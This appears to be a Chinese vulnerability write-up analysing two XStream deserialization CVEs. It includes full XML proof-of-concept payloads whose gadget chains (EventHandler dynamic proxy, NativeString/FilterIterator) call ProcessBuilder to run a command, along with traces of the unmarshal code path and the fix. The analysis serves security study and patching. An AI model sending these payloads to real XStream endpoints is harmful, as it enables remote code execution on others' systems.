## XStream反序列化

### CVE-2013-7285
* Affected Version <= 1.4.6 (and 1.4.10)  
* POC
```
<sorted-set>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>open</string>
                    <string>/System/Applications/Calculator.app</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

* #### POC拆解
动态代理（在运行期间动态创建接口对象）。demo如下，Hello是要实现的接口。hello.morning会自动调用InvocationHandler.invoke
```
InvocationHandler handler = new InvocationHandler() {
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {...}
};

Hello hello = (Hello) Proxy.newProxyInstance(
    Hello.class.getClassLoader(), // 传入ClassLoader
    new Class[] { Hello.class }, // 传入要实现的接口
    handler); // 传入处理调用方法的InvocationHandler
hello.morning("Bob");
```
poc的动态代理写法，compareTo会自动调用EventHandler.invoke
```
EventHandler ih = new EventHandler(new java.lang.ProcessBuilder("open","/System/Applications/Calculator.app"),"start",null,null);
Comparable cp = (Comparable) Proxy.newProxyInstance(Comparable.class.getClassLoader(),new Class[] { Comparable.class },ih);
cp.compareTo(null);
```
上述Java对象调用过程如何转换成xml？
外层，动态代理对象Proxy.newProxyInstance参数，官方也给出了动态代理转换Converter的Demo，即xml对应interface和InvocationHandler参数，类需要采用全限定类名
```
public static Object newProxyInstance(ClassLoader loader,Class<?>[] interfaces,InvocationHandler h)

<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    ...
  </handler>
</dynamic-proxy>
```
内层，EventHandler构造函数赋值了该类的四个属性，后两个参数值传入的null，前两个按照target和action标签生成
```
public EventHandler(Object target, String action, String eventPropertyName, String listenerMethodName) {
  this.target = target;
  this.action = action;      
  this.eventPropertyName = eventPropertyName;
  this.listenerMethodName = listenerMethodName;
}

<target class="java.lang.ProcessBuilder">
  ...
</target>
<action>start</action>
```
最内层，传入ProcessBuilder，赋值的是该类的command属性。所以对应xml标签是command
```
public ProcessBuilder(String... command) {
    this.command = new ArrayList<>(command.length);
    for (String arg : command)
        this.command.add(arg);
}

<command>
    <string>open</string>
    <string>/System/Applications/Calculator.app</string>
</command>
```

* #### xml解析过程
xml的解析也就是反序列化过程，用fromXML()方法作为入口。重点在于标签的解析。（1）标签与类、类属性之间的转换 （2）标签属性与类属性值的转换。
反序列化过程最核心的两步: 
```
# (1)
Class type = HierarchicalStreams.readClassType(this.reader, this.mapper);  // 获取标签; realClass查找标签对应的接口和类;  "interface java.util.SortedSet"
Object result = this.convertAnother((Object)null, type);  // 根据type接口查/类找其实现类; 然后根据实现类找到对应的Converter; 
```
具体看一下`converAnother()`方法，实际上就是根据标签的类型找到其实现类，进而找到处理该类的转换器，进行具体反序列化过程
```
# (2)
public Object convertAnother(Object parent, Class type, Converter converter) {
    type = this.mapper.defaultImplementationOf(type);   // type对应的实现类 "class java.util.TreeSet"
    if (converter == null) {
        converter = this.converterLookup.lookupConverterForType(type);  //转换器 TreeSetConverter
    } ...
    return this.convert(parent, type, converter);  // 进入到转换器的unmarshal方法，如TreeSetConverter.unmarshal
}
```
对于这个POC来说，`TreeSetConverter.unmarshal`方法中有如下一行代码，表明TreeSetConverter实际用了treeMapConverter对comparator进行解析。所以另一种poc是用`tree-map`标签替换了`sorted-set`标签
```
this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);  // -> this.putCurrentEntryIntoMap(reader, context, result, sortedMap);
```
这一行的实际调用代码如下
```
# (3)
protected void putCurrentEntryIntoMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, Map target) {
    Object key = this.readItem(reader, context, map); // 这一步和(1)中的代码一样，对子标签开始上述反序列化过程。上述poc中的子标签是dynamic-proxy，对应转换器就是DynamicProxyConverter
    target.put(key, key);
}
```
这里解析一下`DynamicProxyConverter`的`unmarshal`过程
```
# (4)
for(handlerType = null; reader.hasMoreChildren(); reader.moveUp()) {  // 循环遍历同级标签
    String elementName = reader.getNodeName();  // 获取标签名称
    if (elementName.equals("interface")) {
        interfaces.add(this.mapper.realClass(reader.getValue()));  // 获取标签值, realClass找到该值对应的类或接口, "interface java.lang.Comparable"
    } else if (elementName.equals("handler")) {
        handlerType = this.mapper.realClass(reader.getAttribute("class")); // 获取class属性对应值， "class java.beans.EventHandler"
    }
}

handler = (InvocationHandler)context.convertAnother(proxy, handlerType); // 对EventHandler进行反序列化，EventHandler对应的转换器是ReflectionConverter
```
然后进入到`AbstractReflectionConverter`的`unmarshal`过程
```
# (5)
public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    Object result = this.instantiateNewInstance(reader, context);  // 对handlerType对应的类进行实例化
    result = this.doUnmarshal(result, reader, context);  // 写入类的属性值
    return this.serializationMethodInvoker.callReadResolve(result);
}
```
doUnmarshal方法简化如下
```
# (6)
public Object doUnmarshal(Object result, HierarchicalStreamReader reader, UnmarshallingContext context) {
    Class resultType = result.getClass();
    Iterator it = reader.getAttributeNames();
    while(it.hasNext()) { 
        Field field = this.reflectionProvider.getFieldOrNull(resultType, "class"); //获取标签中class属性对应的类属性
    }
    for(implicitCollectionsForCurrentObject = null; reader.hasMoreChildren(); reader.moveUp()) {
        reader.moveDown();
        originalNodeName = reader.getNodeName();  // 获取子节点名称，如target标签
        field = this.reflectionProvider.getFieldOrNull(classDefiningField, fieldName);
        ...
        classAttribute = HierarchicalStreams.readClassAttribute(reader, this.mapper); // 获取target标签后class属性值
        if (classAttribute != null) {
            type = this.mapper.realClass(classAttribute);  // 获取class属性值对应的类 "class java.lang.ProcessBuilder"
        } else {
            type = this.mapper.defaultImplementationOf(field.getType()); // 如果标签没有class属性值，就获取标签的数据类型对应的接口/实现类，例如command标签对应的数据类型是ArrayList
        }

        value = this.unmarshallField(context, result, type, field);  // -> convertAnother -> convert -> 进入代码段(5)，实例化target对应的ProcessBuilder,再执行doUnmarshal对子标签解析，如command
        
        this.reflectionProvider.writeField(result, fieldName, value, field.getDeclaringClass());
        seenFields.add(new FastField(field.getDeclaringClass(), fieldName));
    }
}

public Field fieldOrNull(Class cls, String name, Class definedIn) {
    Field field = (Field)fields.get(definedIn != null ? new FieldKey(name, definedIn, -1) : name); // fields中包含该类所有的属性对应情况，形如target -> {Field@1758} "private java.lang.Object java.beans.EventHandler.target"
    return field;
}
```
doUnmarshal对子标签进行循环解析,解析Command子标签，ArrayList类型对应转换器CollectionConverter，然后进入到CollectionConverter.unmarshal。再对子标签String进行解析，String对应转换器SingleValueConverterWrapper，它的unmarshal方法实际就是对String标签中的值进行获取

* #### 漏洞成因
这个poc的入口选取的Sorted-set，对应TreeSetConverter
```
TreeSetConverter.unmarshal()
  TreeMapConverter.populateTreeMap()
    TreeMap.putAll()
      AbstractMap.putAll()
        TreeMap.put()
          TreeMap.compare()
            $Proxy0.compareTo()
              EventHandler.invoke()
                EventHandler.invokeInternal()
                  ...
                    ProcessBuilder.start()
```
执行到EventHandler.invokeInternal()中，有一句反射调用，此时传入的targetMethod是`ProcessBuilder.start()`，target是`ProcessBuilder`对象，newArgs是参数数组
```
return MethodUtil.invoke(targetMethod, target, newArgs);
```

* #### POC2
上面提到treeSet底层也是用treeMap来处理的，所以可以用treemap标签来替换
```
<tree-map>
    <entry>
        <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
                <target class="java.lang.ProcessBuilder">
                    <command>
                        <string>open</string>
                        <string>/System/Applications/Calculator.app</string>
                    </command>
                </target>
                <action>start</action>
            </handler>
        </dynamic-proxy>
        <string>good</string>
    </entry>
</tree-map>
```
TreeMap的基础用法和对应的xml结构如下，然后将对象换成动态代理即可。
```
Map<String, String> map = new TreeMap<>();
map.put("axisx", "ddd");

<tree-map>
  <entry>
    <string>axisx</string>
    <string>ddd</string>
  </entry>
</tree-map>
```
#### 补丁修复
EventHandler对应的转换器是ReflectionConverter，修复时在ReflectionConverter中禁止了EventHandler。后续则是在SecurityMapper#readClass把EventHandler作为黑名单。
```
public boolean canConvert(Class type) {
    return ((this.type != null && this.type == type) || (this.type == null && type != null && type != eventHandlerType))
        && canAccess(type);
}
```

### CVE-2020-26217
* Affected Version <= 1.4.13
* POC
```
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='javax.imageio.spi.FilterIterator'>
                  <iter class='java.util.ArrayList$Itr'>
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>open</string>
                          <string>/System/Applications/Calculator.app</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

* #### 漏洞成因
```
jdk.nashorn.internal.objects.NativeString#hashCode
    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString
        javax.activation.DataHandler#getDataSource
            com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream
                javax.crypto.CipherInputStream#read -> getMoreData
                    javax.crypto.NullCipher#update -> chooseFirstProvider
                        javax.imageio.spi.FilterIterator#next
                            javax.imageio.ImageIO.ContainsFilter#filter
                                ProcessBuilder#start
```
